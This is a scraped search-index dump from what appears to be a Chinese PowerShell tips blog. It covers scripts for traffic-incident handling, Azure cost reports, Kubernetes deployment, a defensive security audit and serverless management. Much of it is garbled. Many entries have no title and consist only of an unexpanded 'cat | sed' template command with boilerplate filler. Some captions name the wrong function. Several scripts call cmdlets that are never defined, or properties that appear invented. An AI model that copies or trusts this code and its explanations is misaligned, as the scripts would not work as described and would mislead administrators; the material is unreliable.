return $controller } catch { Write-Error &quot;信号灯控制失败：$_&quot; return $null }} 上面的代码定义了一个名为 Monitor-TrafficFlow 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。 事故处理最后，创建一个用于处理交通事故的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120function Handle-TrafficIncident { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$IncidentID, [Parameter()] [string]$Location, [Parameter()] [string]$Type, [Parameter()] [string]$Severity, [Parameter()] [string[]]$AffectedLanes, [Parameter()] [string]$ResponseTeam, [Parameter()] [string]$LogPath ) try { $handler = [PSCustomObject]@{ IncidentID = $IncidentID StartTime = Get-Date Location = $Location Type = $Type Severity = $Severity AffectedLanes = $AffectedLanes Status = &quot;Initializing&quot; Actions = @() Updates = @() } # 获取事故详情 $incidentDetails = Get-IncidentDetails -IncidentID $IncidentID # 评估影响范围 $impact = Assess-IncidentImpact -Location $Location -Type $Type -Severity $Severity # 通知应急响应团队 if ($ResponseTeam) { $notification = Send-EmergencyNotification ` -Team $ResponseTeam ` -IncidentID $IncidentID ` -Location $Location ` -Type $Type ` -Severity $Severity $handler.Actions += $notification } # 调整交通信号 if ($AffectedLanes) { $signalAction = Adjust-TrafficSignals ` -Location $Location ` -AffectedLanes $AffectedLanes ` -IncidentType $Type $handler.Actions += $signalAction } # 更新交通信息 $infoAction = Update-TrafficInfo ` -Location $Location ` -IncidentID $IncidentID ` -Impact $impact $handler.Actions += $infoAction # 记录事故处理过程 if ($LogPath) { $incidentLog = [PSCustomObject]@{ Time = Get-Date IncidentID = $IncidentID Location = $Location Type = $Type Severity = $Severity Impact = $impact Actions = $handler.Actions } $incidentLog | ConvertTo-Json | Out-File -FilePath $LogPath -Append } # 监控事故处理进度 while ($handler.Status -ne &quot;Resolved&quot;) { $progress = Get-IncidentProgress -IncidentID $IncidentID $handler.Status = $progress.Status if ($progress.Status -eq &quot;In Progress&quot;) { $handler.Updates += [PSCustomObject]@{ Time = Get-Date Status = $progress.Status Details = $progress.Details } # 更新交通信息 Update-TrafficInfo -Location $Location -Progress $progress } Start-Sleep -Seconds 300 } # 恢复交通 $recoveryAction = Restore-TrafficFlow ` -Location $Location ` -AffectedLanes $AffectedLanes $handler.Actions += $recoveryAction # 更新处理状态 $handler.EndTime = Get-Date return $handler } catch { Write-Error &quot;事故处理失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理智能交通的示例： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768# 配置交通流量监控$monitorConfig = @{ IntersectionID = &quot;INT001&quot; Lanes = @(&quot;North&quot;, &quot;South&quot;, &quot;East&quot;, &quot;West&quot;) SamplingInterval = 30 DataPath = &quot;C:\\Data\\traffic_flow.json&quot; Thresholds = @{ &quot;VehicleCount&quot; = @{ Max = 100 } &quot;AverageSpeed&quot; = @{ Min = 20 } &quot;Occupancy&quot; = @{ Max = 0.8 } }}# 启动交通流量监控$monitor = Start-Job -ScriptBlock { param($config) Monitor-TrafficFlow -IntersectionID $config.IntersectionID ` -Lanes $config.Lanes ` -SamplingInterval $config.SamplingInterval ` -DataPath $config.DataPath ` -Thresholds $config.Thresholds} -ArgumentList $monitorConfig# 配置信号灯控制$signalConfig = @{ IntersectionID = &quot;INT001&quot; Timing = @{ &quot;North&quot; = @{ Duration = 30 Phase = &quot;Green&quot; } &quot;South&quot; = @{ Duration = 30 Phase = &quot;Green&quot; } &quot;East&quot; = @{ Duration = 25 Phase = &quot;Green&quot; } &quot;West&quot; = @{ Duration = 25 Phase = &quot;Green&quot; } } Adaptive = $true LogPath = &quot;C:\\Logs\\signal_control.json&quot;}# 管理信号灯$controller = Manage-TrafficSignals -IntersectionID $signalConfig.IntersectionID ` -Timing $signalConfig.Timing ` -Adaptive:$signalConfig.Adaptive ` -LogPath $signalConfig.LogPath# 处理交通事故$incident = Handle-TrafficIncident -IncidentID &quot;INC001&quot; ` -Location &quot;INT001-North&quot; ` -Type &quot;Accident&quot; ` -Severity &quot;High&quot; ` -AffectedLanes @(&quot;North&quot;) ` -ResponseTeam &quot;Emergency-001&quot; ` -LogPath &quot;C:\\Logs\\traffic_incidents.json&quot; 最佳实践 实施实时交通监控 优化信号配时方案 建立快速响应机制 保持详细的运行记录 定期进行系统评估 实施应急预案 建立数据分析体系 保持系统文档更新","link":"/2025/02/10/powershell-smart-traffic/"},{"title":"","text":"$(cat _posts/2025-02-11-powershell-regex-application.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/11/powershell-regex-application/"},{"title":"","text":"$(cat _posts/2025-02-12-powershell-patch-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/12/powershell-patch-management/"},{"title":"PowerShell 技能连载 - Azure多云成本优化实践","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748function Get-AzureCostAnalysis { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string[]]$SubscriptionIds, [datetime]$StartDate = (Get-Date).AddDays(-30) ) $report = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' ResourceAnalysis = @() CostRecommendations = @() } foreach ($subId in $SubscriptionIds) { Set-AzContext -SubscriptionId $subId | Out-Null # 获取资源消耗数据 $resources = Get-AzResource | Where-Object { $_.ResourceType -notin @('Microsoft.Resources/deployments','Microsoft.Resources/subscriptions') } $resourceGroups = $resources | Group-Object ResourceGroupName foreach ($rg in $resourceGroups) { $costData = Get-AzConsumptionUsageDetail -StartDate $StartDate -EndDate (Get-Date) -ResourceGroup $rg.Name $report.ResourceAnalysis += [PSCustomObject]@{ Subscription = $subId ResourceGroup = $rg.Name TotalCost = ($costData | Measure-Object PretaxCost -Sum).Sum UnderutilizedVMs = $rg.Group.Where{ $_.ResourceType -eq 'Microsoft.Compute/virtualMachines' }.Count } } } # 生成优化建议 $report.ResourceAnalysis | ForEach-Object { if ($_.UnderutilizedVMs -gt 5) { $report.CostRecommendations += [PSCustomObject]@{ Recommendation = &quot;调整资源组 $($_.ResourceGroup) 中未充分利用的VM规模&quot; PotentialSavings = &quot;预计节省 $([math]::Round($_.TotalCost * 0.3)) 美元&quot; } } } $report | Export-Excel -Path &quot;$env:TEMP/AzureCostReport_$(Get-Date -Format yyyyMMdd).xlsx&quot; return $report} 核心功能： 跨订阅资源消耗分析 闲置VM资源自动识别 成本节约潜力预测 Excel报告自动生成 典型应用场景： 企业多云成本可视化管理 FinOps实践中的资源优化 预算执行情况跟踪 云服务商比价数据支持","link":"/2025/02/13/powershell-multicloud-cost-optimization/"},{"title":"","text":"$(cat _posts/2025-02-14-powershell-ai-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/14/powershell-ai-integration/"},{"title":"","text":"$(cat _posts/2025-02-17-powershell-kubernetes-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/17/powershell-kubernetes-management/"},{"title":"","text":"$(cat _posts/2025-02-18-powershell-debugging-techniques.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell的调试技术，这对于开发和故障排除非常有用。通过设置调试首选项和使用调试命令，开发人员可以获得有关脚本执行的详细信息，帮助识别和解决问题。这些工具是开发可靠PowerShell脚本的重要组成部分。\\n/}pd}p’)","link":"/2025/02/18/powershell-debugging-techniques/"},{"title":"","text":"$(cat _posts/2025-02-19-powershell-kubernetes-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/19/powershell-kubernetes-management/"},{"title":"PowerShell 技能连载 - 智能日志分析与模式识别","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354function Invoke-AILogAnalysis { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$LogPath, [ValidateSet('Classification','Anomaly')] [string]$AnalysisType = 'Classification' ) $analysisReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' TotalEntries = 0 DetectedPatterns = @() ModelAccuracy = 0 } try { # 加载预训练机器学习模型 $model = Import-MLModel -Path &quot;$PSScriptRoot/log_analysis_model.zip&quot; # 预处理日志数据 $logData = Get-Content $LogPath | ConvertFrom-LogEntry -ErrorAction Stop | Select-Object TimeGenerated, Message, Level $analysisReport.TotalEntries = $logData.Count # 执行AI分析 $predictions = switch($AnalysisType) { 'Classification' { $logData | Invoke-MLClassification -Model $model } 'Anomaly' { $logData | Invoke-MLAnomalyDetection -Model $model } } # 生成检测报告 $analysisReport.DetectedPatterns = $predictions | Where-Object { $_.Probability -gt 0.7 } | Select-Object LogMessage, PatternType, Probability # 计算模型准确率 $analysisReport.ModelAccuracy = ($predictions.ValidationScore | Measure-Object -Average).Average } catch { Write-Error &quot;日志分析失败: $_&quot; } # 生成智能分析报告 $analysisReport | Export-Csv -Path &quot;$env:TEMP/AILogReport_$(Get-Date -Format yyyyMMdd).csv&quot; return $analysisReport} 核心功能： 机器学习模型集成调用 日志数据智能分类与异常检测 预测结果概率分析 模型准确率动态计算 应用场景： IT运维日志模式识别 安全事件自动化检测 系统故障预测分析 日志数据质量评估","link":"/2025/02/24/powershell-ai-log-analysis/"},{"title":"","text":"$(cat _posts/2025-02-25-powershell-asset-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/25/powershell-asset-management/"},{"title":"","text":"$(cat _posts/2025-02-25-powershell-video-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/25/powershell-video-processing/"},{"title":"","text":"$(cat _posts/2025-02-26-powershell-excel-processing.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/26/powershell-excel-processing/"},{"title":"PowerShell 技能连载 - 云原生配置管理","text":"在云原生环境中，自动化资源配置管理至关重要。以下脚本实现Kubernetes部署模板生成与应用： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function New-K8sDeployment { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$AppName, [ValidateRange(1,10)] [int]$Replicas = 3, [ValidateSet('development','production')] [string]$Environment = 'production' ) $yaml = @&quot;apiVersion: apps/v1kind: Deploymentmetadata: name: $AppName-$Environmentspec: replicas: $Replicas selector: matchLabels: app: $AppName template: metadata: labels: app: $AppName env: $Environment spec: containers: - name: $AppName image: registry/vichamp/$AppName:latest resources: limits: memory: &quot;512Mi&quot; cpu: &quot;500m&quot;&quot;@ try { $tempFile = New-TemporaryFile $yaml | Out-File $tempFile.FullName kubectl apply -f $tempFile.FullName [PSCustomObject]@{ AppName = $AppName Environment = $Environment Manifest = $yaml Status = 'Applied' } } catch { Write-Error &quot;Kubernetes部署失败: $_&quot; } finally { Remove-Item $tempFile.FullName -ErrorAction SilentlyContinue }} 实现原理： 使用here-string动态生成标准YAML部署模板 通过环境参数控制副本数量和部署环境 自动创建临时文件执行kubectl apply命令 返回包含应用状态的定制对象 完善的错误处理与临时文件清理机制 使用示例： 1New-K8sDeployment -AppName 'order-service' -Environment 'production' -Replicas 5 最佳实践： 与CI/CD流水线集成实现自动部署 添加资源请求/限制验证逻辑 实现部署历史版本回滚功能 集成Prometheus监控指标 注意事项：• 需要配置kubectl访问权限• 建议添加YAML语法验证• 生产环境需设置严格的资源限制","link":"/2025/02/27/powershell-cloudnative-config/"},{"title":"","text":"$(cat _posts/2025-02-28-powershell-infrastructure-as-code.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/02/28/powershell-infrastructure-as-code/"},{"title":"","text":"$(cat _posts/2025-03-04-powershell-system-optimization.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/04/powershell-system-optimization/"},{"title":"","text":"$(cat _posts/2025-03-05-powershell-debugging-techniques.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell的调试技术，这对于开发和故障排除非常有用。通过设置调试首选项和使用调试命令，开发人员可以获得有关脚本执行的详细信息，帮助识别和解决问题。这些工具是开发可靠PowerShell脚本的重要组成部分。\\n/}pd}p’)","link":"/2025/03/05/powershell-debugging-techniques/"},{"title":"","text":"$(cat _posts/2025-03-06-powershell-function-definition.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码定义了一个PowerShell函数，用于封装特定的功能，使其可重用。函数是PowerShell脚本中组织代码的基本单元，可以接受参数、执行操作并返回结果。通过将相关代码组织到函数中，可以提高代码的可读性、可维护性和可重用性。\\n/}pd}p’)","link":"/2025/03/06/powershell-function-definition/"},{"title":"","text":"$(cat _posts/2025-03-07-powershell-flow-control.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/07/powershell-flow-control/"},{"title":"PowerShell 技能连载 - Kubernetes 节点智能编排","text":"1234567891011121314151617181920212223242526272829303132333435function Invoke-K8sNodeOrchestration { [CmdletBinding()] param( [ValidateSet('ScaleUp','ScaleDown','Maintenance')] [string]$Operation, [int]$NodeCount = 1 ) $nodePool = Get-AzAksNodePool -ClusterName 'prod-cluster' $metrics = Invoke-RestMethod -Uri 'http://k8s-metrics:8080/api/v1/nodes' switch ($Operation) { 'ScaleUp' { $newCount = $nodePool.Count + $NodeCount Update-AzAksNodePool -Name $nodePool.Name -Count $newCount Write-Host &quot;节点池已扩容至$newCount个节点&quot; } 'ScaleDown' { $nodesToRemove = $metrics.Nodes | Where-Object { $_.CpuUsage -lt 20 } | Select-Object -First $NodeCount $nodesToRemove | ForEach-Object { Set-AzAksNode -Name $_.Name -State Draining } } 'Maintenance' { $metrics.Nodes | Where-Object { $_.HealthStatus -ne 'Healthy' } | ForEach-Object { Add-K8sNodeLabel -Node $_.Name -Label @{ 'maintenance' = (Get-Date).ToString('yyyyMMdd') } } } }} 核心功能： 节点自动扩缩容策略 基于资源利用率的智能调度 维护模式自动标签管理 与Azure AKS深度集成 典型应用场景： 应对突发流量自动扩容节点 低负载时段自动缩容节约成本 异常节点自动隔离维护 跨可用区节点平衡管理","link":"/2025/03/10/powershell-k8s-automation/"},{"title":"","text":"$(cat _posts/2025-03-12-powershell-exchange-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/12/powershell-exchange-management/"},{"title":"","text":"$(cat _posts/2025-03-11-powershell-event-log-management.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/11/powershell-event-log-management/"},{"title":"","text":"$(cat _posts/2025-03-13-powershell-collection-operations.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/13/powershell-collection-operations/"},{"title":"","text":"$(cat _posts/2025-03-14-powershell-rest-api-integration.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2025/03/14/powershell-rest-api-integration/"},{"title":"PowerShell 技能连载 - 自动化安全审计","text":"在企业安全运维中，自动化审计能有效发现潜在风险。以下脚本实现系统安全配置审查： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function Get-SecurityAudit { [CmdletBinding()] param( [ValidateSet('Basic','Advanced')] [string]$AuditLevel = 'Basic' ) $report = [PSCustomObject]@{ FailedLogins = @() OpenPorts = @() WeakPermissions = @() ComplianceScore = 0 } try { # 分析安全事件日志 $events = Get-WinEvent -FilterHashtable @{ LogName = 'Security' ID = 4625 StartTime = (Get-Date).AddDays(-7) } -MaxEvents 1000 $report.FailedLogins = $events | Select-Object -ExpandProperty Message # 扫描开放端口 $report.OpenPorts = Get-NetTCPConnection | Where-Object State -eq 'Listen' | Select-Object LocalAddress,LocalPort # 高级权限检查 if($AuditLevel -eq 'Advanced') { $report.WeakPermissions = Get-ChildItem -Path $env:ProgramFiles -Recurse | Where-Object { $_.PSAccessControl.Access.IdentityReference -contains 'Everyone' } } # 计算合规分数 $totalChecks = 3 $passed = ([bool]!$report.FailedLogins.Count) + ([bool]!$report.OpenPorts.Count) + ([bool]!$report.WeakPermissions.Count) $report.ComplianceScore = [math]::Round(($passed / $totalChecks) * 100) } catch { Write-Warning &quot;安全审计异常: $_&quot; } return $report} 实现原理： 通过Get-WinEvent查询安全事件日志，检测暴力破解行为 使用Get-NetTCPConnection发现异常监听端口 高级模式扫描程序目录权限配置 基于检测结果计算系统合规分数 使用示例： 12345# 基本审计Get-SecurityAudit# 高级审计Get-SecurityAudit -AuditLevel Advanced 最佳实践： 与SIEM系统集成实现集中告警 设置基线配置进行差异对比 定期生成PDF格式审计报告 实现自动修复高风险项功能 注意事项：• 需要本地管理员权限执行• 端口扫描可能触发安全告警• 建议在维护窗口执行深度扫描","link":"/2025/03/18/powershell-security-audit/"},{"title":"PowerShell 技能连载 - Serverless 管理","text":"在无服务器计算时代，PowerShell可以帮助我们更好地管理Serverless应用。本文将介绍如何使用PowerShell构建一个Serverless管理系统，包括函数管理、触发器配置和监控分析等功能。 函数管理首先，让我们创建一个用于管理Serverless函数的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293function Manage-ServerlessFunctions { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$FunctionID, [Parameter()] [string[]]$FunctionTypes, [Parameter()] [ValidateSet(&quot;Create&quot;, &quot;Update&quot;, &quot;Delete&quot;)] [string]$OperationMode = &quot;Create&quot;, [Parameter()] [hashtable]$FunctionConfig, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ FunctionID = $FunctionID StartTime = Get-Date FunctionStatus = @{} Operations = @{} Issues = @() } # 获取函数配置 $config = Get-FunctionConfig -FunctionID $FunctionID # 管理函数 foreach ($type in $FunctionTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用函数配置 $typeConfig = Apply-FunctionConfig ` -Config $config ` -Type $type ` -Mode $OperationMode ` -Settings $FunctionConfig $status.Config = $typeConfig # 执行函数操作 $operations = Execute-FunctionOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 检查函数问题 $issues = Check-FunctionIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新函数状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $manager.FunctionStatus[$type] = $status } # 记录函数日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;Serverless函数管理失败：$_&quot; return $null }} 触发器配置接下来，创建一个用于管理触发器配置的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Configure-ServerlessTriggers { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$TriggerID, [Parameter()] [string[]]$TriggerTypes, [Parameter()] [ValidateSet(&quot;HTTP&quot;, &quot;Timer&quot;, &quot;Queue&quot;, &quot;Blob&quot;)] [string]$TriggerMode = &quot;HTTP&quot;, [Parameter()] [hashtable]$TriggerConfig, [Parameter()] [string]$ReportPath ) try { $configurator = [PSCustomObject]@{ TriggerID = $TriggerID StartTime = Get-Date TriggerStatus = @{} Configurations = @{} Issues = @() } # 获取触发器配置 $config = Get-TriggerConfig -TriggerID $TriggerID # 管理触发器 foreach ($type in $TriggerTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Configurations = @{} Issues = @() } # 应用触发器配置 $typeConfig = Apply-TriggerConfig ` -Config $config ` -Type $type ` -Mode $TriggerMode ` -Settings $TriggerConfig $status.Config = $typeConfig # 配置触发器 $configurations = Configure-TriggerResources ` -Type $type ` -Config $typeConfig $status.Configurations = $configurations $configurator.Configurations[$type] = $configurations # 检查触发器问题 $issues = Check-TriggerIssues ` -Configurations $configurations ` -Config $typeConfig $status.Issues = $issues $configurator.Issues += $issues # 更新触发器状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $configurator.TriggerStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-TriggerReport ` -Configurator $configurator ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新配置器状态 $configurator.EndTime = Get-Date return $configurator } catch { Write-Error &quot;Serverless触发器配置失败：$_&quot; return $null }} 上面的代码定义了一个名为 Manage-ServerlessFunctions 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。 监控分析最后，创建一个用于管理监控分析的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Monitor-ServerlessPerformance { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$MonitorID, [Parameter()] [string[]]$MonitorTypes, [Parameter()] [ValidateSet(&quot;Metrics&quot;, &quot;Logs&quot;, &quot;Events&quot;)] [string]$MonitorMode = &quot;Metrics&quot;, [Parameter()] [hashtable]$MonitorConfig, [Parameter()] [string]$ReportPath ) try { $monitor = [PSCustomObject]@{ MonitorID = $MonitorID StartTime = Get-Date MonitorStatus = @{} Metrics = @{} Alerts = @() } # 获取监控配置 $config = Get-MonitorConfig -MonitorID $MonitorID # 管理监控 foreach ($type in $MonitorTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Metrics = @{} Alerts = @() } # 应用监控配置 $typeConfig = Apply-MonitorConfig ` -Config $config ` -Type $type ` -Mode $MonitorMode ` -Settings $MonitorConfig $status.Config = $typeConfig # 收集监控指标 $metrics = Collect-ServerlessMetrics ` -Type $type ` -Config $typeConfig $status.Metrics = $metrics $monitor.Metrics[$type] = $metrics # 检查监控告警 $alerts = Check-MonitorAlerts ` -Metrics $metrics ` -Config $typeConfig $status.Alerts = $alerts $monitor.Alerts += $alerts # 更新监控状态 if ($alerts.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Normal&quot; } $monitor.MonitorStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-MonitorReport ` -Monitor $monitor ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新监控器状态 $monitor.EndTime = Get-Date return $monitor } catch { Write-Error &quot;Serverless监控分析失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理Serverless环境的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103# 管理Serverless函数$manager = Manage-ServerlessFunctions -FunctionID &quot;FUNCTION001&quot; ` -FunctionTypes @(&quot;HTTP&quot;, &quot;Timer&quot;, &quot;Queue&quot;) ` -OperationMode &quot;Create&quot; ` -FunctionConfig @{ &quot;HTTP&quot; = @{ &quot;Name&quot; = &quot;http-function&quot; &quot;Runtime&quot; = &quot;PowerShell&quot; &quot;Version&quot; = &quot;7.2&quot; &quot;Memory&quot; = 256 &quot;Timeout&quot; = 30 &quot;Bindings&quot; = @{ &quot;Type&quot; = &quot;httpTrigger&quot; &quot;Direction&quot; = &quot;in&quot; &quot;Name&quot; = &quot;req&quot; &quot;Methods&quot; = @(&quot;GET&quot;, &quot;POST&quot;) &quot;AuthLevel&quot; = &quot;function&quot; } } &quot;Timer&quot; = @{ &quot;Name&quot; = &quot;timer-function&quot; &quot;Runtime&quot; = &quot;PowerShell&quot; &quot;Version&quot; = &quot;7.2&quot; &quot;Memory&quot; = 256 &quot;Timeout&quot; = 30 &quot;Bindings&quot; = @{ &quot;Type&quot; = &quot;timerTrigger&quot; &quot;Direction&quot; = &quot;in&quot; &quot;Name&quot; = &quot;timer&quot; &quot;Schedule&quot; = &quot;0 */5 * * * *&quot; } } &quot;Queue&quot; = @{ &quot;Name&quot; = &quot;queue-function&quot; &quot;Runtime&quot; = &quot;PowerShell&quot; &quot;Version&quot; = &quot;7.2&quot; &quot;Memory&quot; = 256 &quot;Timeout&quot; = 30 &quot;Bindings&quot; = @{ &quot;Type&quot; = &quot;queueTrigger&quot; &quot;Direction&quot; = &quot;in&quot; &quot;Name&quot; = &quot;queue&quot; &quot;QueueName&quot; = &quot;myqueue&quot; &quot;Connection&quot; = &quot;AzureWebJobsStorage&quot; } } } ` -LogPath &quot;C:\\Logs\\function_management.json&quot;# 配置函数触发器$configurator = Configure-ServerlessTriggers -TriggerID &quot;TRIGGER001&quot; ` -TriggerTypes @(&quot;HTTP&quot;, &quot;Timer&quot;, &quot;Queue&quot;) ` -TriggerMode &quot;HTTP&quot; ` -TriggerConfig @{ &quot;HTTP&quot; = @{ &quot;Route&quot; = &quot;api/process&quot; &quot;Methods&quot; = @(&quot;GET&quot;, &quot;POST&quot;) &quot;AuthLevel&quot; = &quot;function&quot; &quot;Cors&quot; = @{ &quot;Origins&quot; = @(&quot;https://example.com&quot;) &quot;Methods&quot; = @(&quot;GET&quot;, &quot;POST&quot;) &quot;Headers&quot; = @(&quot;Content-Type&quot;, &quot;Authorization&quot;) } } &quot;Timer&quot; = @{ &quot;Schedule&quot; = &quot;0 */5 * * * *&quot; &quot;UseMonitor&quot; = $true &quot;RunOnStartup&quot; = $true } &quot;Queue&quot; = @{ &quot;QueueName&quot; = &quot;myqueue&quot; &quot;Connection&quot; = &quot;AzureWebJobsStorage&quot; &quot;BatchSize&quot; = 16 &quot;MaxDequeueCount&quot; = 5 } } ` -ReportPath &quot;C:\\Reports\\trigger_configuration.json&quot;# 监控函数性能$monitor = Monitor-ServerlessPerformance -MonitorID &quot;MONITOR001&quot; ` -MonitorTypes @(&quot;Execution&quot;, &quot;Memory&quot;, &quot;Network&quot;) ` -MonitorMode &quot;Metrics&quot; ` 